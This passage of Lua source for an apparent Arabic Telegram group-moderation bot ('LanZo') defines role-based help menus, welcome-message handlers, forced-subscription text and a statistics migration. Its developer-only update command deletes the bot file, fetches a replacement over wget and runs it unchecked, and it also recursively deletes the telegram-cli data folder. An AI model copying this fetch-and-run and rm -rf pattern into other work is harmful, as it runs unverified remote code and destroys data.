᥀︙قفل • فتح ↫ العربيه
᥀︙قفل • فتح ↫ الانكليزيه
᥀︙قفل • فتح ↫ الفارسيه
᥀︙قفل • فتح ↫ التفليش
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر حمايه اخرى ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح + الامر ↫ ⤈
᥀︙التكرار بالطرد
᥀︙التكرار بالكتم
᥀︙التكرار بالتقيد
᥀︙الفارسيه بالطرد
᥀︙البوتات بالطرد
᥀︙البوتات بالتقيد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
Dev_aMeR(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م2" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٢" and SecondSudo(msg) and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م2) الان " ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LanZoTeam =  DevaMeR:get(LanZo..'aMeR:Help21'..msg.sender_user_id_)
if LanZoTeam == 'msg' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevaMeR:del(LanZo..'aMeR:Help21'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:Help2', text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م2" and ChCheck(msg) or text == "م٢" and ChCheck(msg) or text == "اوامر2" and ChCheck(msg) or text == "اوامر٢" and ChCheck(msg) then
if not Admin(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevaMeR:get(LanZo..'aMeR:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
᥀︙تاك للكل 
᥀︙انشاء رابط
᥀︙ضع وصف
᥀︙ضع رابط
᥀︙ضع صوره
᥀︙حذف الرابط
᥀︙كشف البوتات
᥀︙طرد البوتات
᥀︙تنظيف + العدد
᥀︙تنظيف التعديل
᥀︙كللهم + الكلمه
᥀︙اسم البوت + الامر
᥀︙ضع • حذف ↫ ترحيب
᥀︙ضع • حذف ↫ قوانين
᥀︙اضف • حذف ↫ صلاحيه
᥀︙الصلاحيات • حذف الصلاحيات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙ضع سبام + العدد
᥀︙ضع تكرار + العدد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع مميز • تنزيل مميز
᥀︙المميزين • حذف المميزين
᥀︙كشف القيود • رفع القيود
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙حذف • مسح + بالرد
᥀︙منع • الغاء منع
᥀︙قائمه المنع
᥀︙حذف قائمه المنع
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل ↫ الرابط
᥀︙تفعيل • تعطيل ↫ الالعاب
᥀︙تفعيل • تعطيل ↫ الترحيب
᥀︙تفعيل • تعطيل ↫ التاك للكل
᥀︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙طرد المحذوفين
᥀︙طرد ↫ بالرد • بالمعرف • بالايدي
᥀︙كتم • الغاء كتم
᥀︙تقيد • الغاء تقيد
᥀︙حظر • الغاء حظر
᥀︙المكتومين • حذف المكتومين
᥀︙المقيدين • حذف المقيدين
᥀︙المحظورين • حذف المحظورين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تقييد دقيقه + عدد الدقائق
᥀︙تقييد ساعه + عدد الساعات
᥀︙تقييد يوم + عدد الايام
᥀︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
Dev_aMeR(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م3" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٣" and SecondSudo(msg) and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م3) الان " ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LanZoTeam =  DevaMeR:get(LanZo..'aMeR:Help31'..msg.sender_user_id_)
if LanZoTeam == 'msg' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevaMeR:del(LanZo..'aMeR:Help31'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:Help3', text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م3" and ChCheck(msg) or text == "م٣" and ChCheck(msg) or text == "اوامر3" and ChCheck(msg) or text == "اوامر٣" and ChCheck(msg) then
if not Admin(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevaMeR:get(LanZo..'aMeR:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
᥀︙ضع اسم + الاسم
᥀︙اضف • حذف ↫ رد
᥀︙ردود المدير
᥀︙حذف ردود المدير
᥀︙اضف • حذف ↫ رد متعدد
᥀︙حذف رد من متعدد
᥀︙الردود المتعدده
᥀︙حذف الردود المتعدده
᥀︙حذف قوائم المنع
᥀︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
᥀︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙رفع ادمن • تنزيل ادمن
᥀︙الادمنيه • حذف الادمنيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تثبيت
᥀︙الغاء التثبيت
᥀︙اعاده التثبيت
᥀︙الغاء تثبيت الكل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغير رد + اسم الرتبه + النص ↫ ⤈
᥀︙المطور • منشئ الاساسي
᥀︙المنشئ • المدير • الادمن
᥀︙المميز • المنظف • العضو
᥀︙حذف ردود الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغيير الايدي ↫ لتغيير الكليشه
᥀︙تعيين الايدي ↫ لتعيين الكليشه
᥀︙حذف الايدي ↫ لحذف الكليشه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙اطردني • الايدي بالصوره • الابراج
᥀︙معاني الاسماء • اوامر النسب • انطق
᥀︙الايدي • تحويل الصيغ • اوامر التحشيش
᥀︙ردود المدير • ردود المطور • التحقق
᥀︙ضافني • حساب العمر • الزخرفه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
Dev_aMeR(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م4" and ChCheck(msg) and SecondSudo(msg) or text == "تعيين امر م٤" and SecondSudo(msg) and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م4) الان " ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LanZoTeam =  DevaMeR:get(LanZo..'aMeR:Help41'..msg.sender_user_id_)
if LanZoTeam == 'msg' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevaMeR:del(LanZo..'aMeR:Help41'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:Help4', text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٤" and ChCheck(msg) or text == "م4" and ChCheck(msg) or text == "اوامر4" and ChCheck(msg) or text == "اوامر٤" and ChCheck(msg) then
if not Admin(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevaMeR:get(LanZo..'aMeR:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙الميديا • امسح
᥀︙تعين عدد الحذف
᥀︙ترتيب الاوامر
᥀︙اضف • حذف ↫ امر
᥀︙حذف الاوامر المضافه
᥀︙الاوامر المضافه
᥀︙اضف نقاط ↫ بالرد • بالايدي
᥀︙اضف رسائل ↫ بالرد • بالايدي
᥀︙رفع منظف • تنزيل منظف
᥀︙المنظفين • حذف المنظفين
᥀︙رفع مدير • تنزيل مدير
᥀︙المدراء • حذف المدراء
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙نزلني • امسح
᥀︙الحظر • الكتم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙وضع لقب + اللقب
᥀︙تفعيل • تعطيل ↫ الرفع
᥀︙رفع منشئ • تنزيل منشئ
᥀︙المنشئين • حذف المنشئين
᥀︙رفع • تنزيل ↫ مشرف
᥀︙رفع بكل الصلاحيات
᥀︙حذف القوائم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المالكين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ منشئ اساسي
᥀︙حذف المنشئين الاساسيين 
᥀︙المنشئين الاساسيين 
᥀︙حذف جميع الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
Dev_aMeR(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م5" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٥" and SecondSudo(msg) and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م5) الان " ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LanZoTeam =  DevaMeR:get(LanZo..'aMeR:Help51'..msg.sender_user_id_)
if LanZoTeam == 'msg' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevaMeR:del(LanZo..'aMeR:Help51'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:Help5', text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م٥" and ChCheck(msg) or text == "م5" and ChCheck(msg) or text == "اوامر5" and ChCheck(msg) or text == "اوامر٥" and ChCheck(msg) then
if not SudoBot(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمطورين فقط', 1, 'md')
else
local Help = DevaMeR:get(LanZo..'aMeR:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
᥀︙المطورين
᥀︙المشتركين
᥀︙الاحصائيات
᥀︙المجموعات
᥀︙اسم البوت + غادر
᥀︙اسم البوت + تعطيل
᥀︙كشف + -ايدي المجموعه
᥀︙رفع مالك • تنزيل مالك
᥀︙المالكين • حذف المالكين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ مدير عام
᥀︙حذف • المدراء العامين 
᥀︙رفع • تنزيل ↫ ادمن عام
᥀︙حذف • الادمنيه العامين 
᥀︙رفع • تنزيل ↫ مميز عام
᥀︙حذف • المميزين عام 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المطور الاساسي ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تحديث
᥀︙السيرفر
᥀︙روابط الكروبات
᥀︙تحديث السورس
᥀︙تنظيف الكروبات
᥀︙تنظيف المشتركين
᥀︙حذف جميع الملفات
᥀︙تعيين الايدي العام
᥀︙تغير المطور الاساسي
᥀︙حذف معلومات الترحيب
᥀︙تغير معلومات الترحيب
᥀︙غادر + -ايدي المجموعه
᥀︙تعيين عدد الاعضاء + العدد
᥀︙حظر عام • الغاء العام
᥀︙كتم عام • الغاء العام
᥀︙قائمه العام • حذف قائمه العام
᥀︙وضع • حذف ↫ اسم البوت
᥀︙اضف • حذف ↫ رد عام
᥀︙ردود المطور • حذف ردود المطور
᥀︙تعيين • حذف • جلب ↫ رد الخاص
᥀︙جلب نسخه الكروبات
᥀︙رفع النسخه + بالرد على الملف
᥀︙تعيين • حذف ↫ قناة الاشتراك
᥀︙جلب كليشه الاشتراك
᥀︙تغيير • حذف ↫ كليشه الاشتراك
᥀︙رفع • تنزيل ↫ مطور
᥀︙المطورين • حذف المطورين
᥀︙رفع • تنزيل ↫ مطور ثانوي
᥀︙الثانويين • حذف الثانويين
᥀︙تعيين • حذف ↫ كليشة الايدي
᥀︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل ملف + اسم الملف
᥀︙تعطيل ملف + اسم الملف
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙الاذاعه • الاشتراك الاجباري
᥀︙ترحيب البوت • المغادره
᥀︙البوت الخدمي • التواصل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
Dev_aMeR(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م6" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٦" and SecondSudo(msg) and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م6) الان " ,  1, "md")
DevaMeR:set(LanZo..'aMeR:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local LanZoTeam =  DevaMeR:get(LanZo..'aMeR:Help61'..msg.sender_user_id_)
if LanZoTeam == 'msg' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevaMeR:del(LanZo..'aMeR:Help61'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:Help6', text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٦" and ChCheck(msg) or text == "م6" and ChCheck(msg) or text == "اوامر6" and ChCheck(msg) or text == "اوامر٦" and ChCheck(msg) then
local Help = DevaMeR:get(LanZo..'aMeR:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙السورس • موقعي • رتبتي • معلوماتي 
᥀︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
᥀︙رسائلي • حذف رسائلي • اسمي • معرفي 
᥀︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
᥀︙نقاطي • بيع نقاطي • القوانين • زخرفه 
᥀︙رابط الحذف • نزلني • اطردني • المطور 
᥀︙منو ضافني • مشاهدات المنشور • الرابط 
᥀︙ايدي المجموعه • معلومات المجموعه 
᥀︙نسبه الحب • نسبه الكره • نسبه الغباء 
᥀︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙لقبه + بالرد
᥀︙كول + الكلمه
᥀︙زخرفه + اسمك
᥀︙برج + نوع البرج
᥀︙معنى اسم + الاسم
᥀︙بوسه • بوسها ↫ بالرد
᥀︙احسب + تاريخ ميلادك
᥀︙تفاعلي • تفاعله ↫ بالرد
᥀︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
᥀︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
᥀︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
᥀︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
Dev_aMeR(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end
--     Source LanZo     --
if SecondSudo(msg) then
if text == "تحديث السورس" and SourceCh(msg) or text == "تحديث سورس" and SourceCh(msg) or text == "↫ تحديث السورس ᥀" and SourceCh(msg) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس لانزو', 1, 'md') 
os.execute('rm -rf LanZo.lua') 
os.execute('wget https://raw.githubusercontent.com/LanZoTeam8/LanZo/master/LanZo.lua') 
dofile('LanZo.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' and SourceCh(msg) or text == 'تحديث البوت' and SourceCh(msg) or text == '↫ تحديث ᥀' and SourceCh(msg) then  
dofile('LanZo.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تحديث ملفات البوت", 1, "md")
end
--     Source LanZo     --
if text == 'نقل الاحصائيات' and ChCheck(msg) or text == '↫ نقل الاحصائيات ᥀' and ChCheck(msg) then
local Users = DevaMeR:smembers(LanZo.."User_Bot")
local Groups = DevaMeR:smembers(LanZo..'Chek:Groups')
local Sudos = DevaMeR:smembers(LanZo.."Sudo:User")
if DevaMeR:get(LanZo..'Name:Bot') then
DevaMeR:set(LanZo..'aMeR:NameBot',(DevaMeR:get(LanZo..'Name:Bot') or 'لانزو'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevaMeR:sadd(LanZo..'aMeR:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevaMeR:sadd(LanZo..'aMeR:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevaMeR:sadd(LanZo..'aMeR:Groups',Groups[i]) 
if DevaMeR:get(LanZo.."Private:Group:Link"..Groups[i]) then
DevaMeR:set(LanZo.."aMeR:Groups:Links"..Groups[i],DevaMeR:get(LanZo.."Private:Group:Link"..Groups[i]))
end
if DevaMeR:get(LanZo.."Get:Welcome:Group"..Groups[i]) then
DevaMeR:set(LanZo..'aMeR:Groups:Welcomes'..Groups[i],DevaMeR:get(LanZo.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevaMeR:smembers(LanZo..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevaMeR:sadd(LanZo.."aMeR:Constructor:"..Groups[i], v)
end
local list3 = DevaMeR:smembers(LanZo..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevaMeR:sadd(LanZo.."aMeR:BasicConstructor:"..Groups[i], v)
end
local list4 = DevaMeR:smembers(LanZo..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevaMeR:sadd(LanZo.."aMeR:Managers:"..Groups[i], v)
end
local list5 = DevaMeR:smembers(LanZo..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevaMeR:sadd(LanZo.."aMeR:Admins:"..Groups[i], v)
end
local list6 = DevaMeR:smembers(LanZo..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevaMeR:sadd(LanZo.."aMeR:VipMem:"..Groups[i], v)
end
DevaMeR:set(LanZo.."aMeR:Lock:Bots"..Groups[i],"del") DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
LockList ={'aMeR:Lock:Links','aMeR:Lock:Forwards','aMeR:Lock:Videos','aMeR:Lock:Gifs','aMeR:Lock:EditMsgs','aMeR:Lock:Stickers','aMeR:Lock:Farsi','aMeR:Lock:Spam','aMeR:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevaMeR:set(LanZo..Lock..Groups[i],true)
end
end
send(msg.chat_id_, msg.id_,'᥀︙تم نقل ↫ '..#Groups..' مجموعه\n᥀︙تم نقل ↫ '..#Users..' مشترك\n᥀︙من التحديث القديم الى التحديث الجديد')
end
end
--     Source LanZo     --
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) and ChCheck(msg) then    
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف معلومات الترحيب', 1, 'md')   
DevaMeR:del(LanZo..'aMeR:Text:BotWelcome')
DevaMeR:del(LanZo..'aMeR:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب' or text == '↫ تفعيل ترحيب البوت ᥀') and SecondSudo(msg) and ChCheck(msg) then    
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevaMeR:del(LanZo..'aMeR:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب' or text == '↫ تعطيل ترحيب البوت ᥀') and SecondSudo(msg) and ChCheck(msg) then    
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevaMeR:set(LanZo..'aMeR:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب ᥀') and SecondSudo(msg) and ChCheck(msg) then    
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي نص الترحيب', 1, 'md') 
DevaMeR:del(LanZo..'aMeR:Text:BotWelcome')
DevaMeR:del(LanZo..'aMeR:Photo:BotWelcome')
DevaMeR:set(LanZo.."aMeR:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevaMeR:get(LanZo.."aMeR:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevaMeR:del(LanZo.."aMeR:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevaMeR:set(LanZo.."aMeR:Text:BotWelcome",text) 
DevaMeR:set(LanZo.."aMeR:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevaMeR:get(LanZo.."aMeR:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
DevaMeR:del(LanZo.."aMeR:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevaMeR:set(LanZo.."aMeR:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص وصورة الترحيب", 1, 'md')   
DevaMeR:del(LanZo.."aMeR:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     Source LanZo     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") or text and text:match("^↫ تغيير كليشه المطور ᥀$") and ChCheck(msg) then
if not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة المطور الان ", 1, "md")
DevaMeR:setex(LanZo.."aMeR:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف كليشة المطور", 1, "md")
DevaMeR:del(LanZo.."DevText")
end end
--     Source LanZo     --
if DevaMeR:get(LanZo.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevaMeR:del(LanZo.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevaMeR:del(LanZo.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevaMeR:set(LanZo..'aMeR:ChText',texxt)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^↫ تغير كليشه الاشتراك ᥀$") and Sudo(msg)  or text and text:match("^تغيير كليشه الاشتراك$") and Sudo(msg) then  
DevaMeR:setex(LanZo.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
local text = '᥀︙حسنا ارسل كليشة الاشتراك الجديده'  
Dev_aMeR(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "↫ حذف كليشه الاشتراك ᥀" then  
if not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevaMeR:del(LanZo..'aMeR:ChText')
textt = "᥀︙تم حذف كليشة الاشتراك الاجباري"
Dev_aMeR(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' or text == '↫ كليشه الاشتراك ᥀' then
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevaMeR:get(LanZo.."aMeR:ChText")
if chtext then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙كليشة الاشتراك ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n['..chtext..']', 1, 'md')
else
if DevaMeR:get(LanZo.."aMeR:ChId") then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevaMeR:get(LanZo.."aMeR:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*᥀︙عذرا لاتستطيع استخدام البوت !\n᥀︙عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لم يتم تعيين قناة الاشتراك الاجباري \n᥀︙ارسل ↫ تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
--     Source LanZo     --
if text == 'القناة' and SourceCh(msg) or text == 'قناة السورس' and SourceCh(msg) or text == 'قناه السورس' and SourceCh(msg) or text == 'قنات السورس' and SourceCh(msg) or text == '↫ قناة السورس ᥀' and SourceCh(msg) then 
Text = [[
᥀︙[قناة السورس](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ قناة السورس',url="t.me/Bw5Bw"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Bw5Bw&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source LanZo     --
if text == "مبرمج السورس" and SourceCh(msg) or text == "مطور السورس" and SourceCh(msg) or text == "وين المبرمج" and SourceCh(msg) or text == "المبرمج" and SourceCh(msg) or text == "↫ مبرمج السورس ᥀" and SourceCh(msg) then 
Text = [[
᥀︙[مبرمج السورس](https://t.me/lMlMMM)
]]
keyboard = {} 
keyboard.inline_keyboard = {
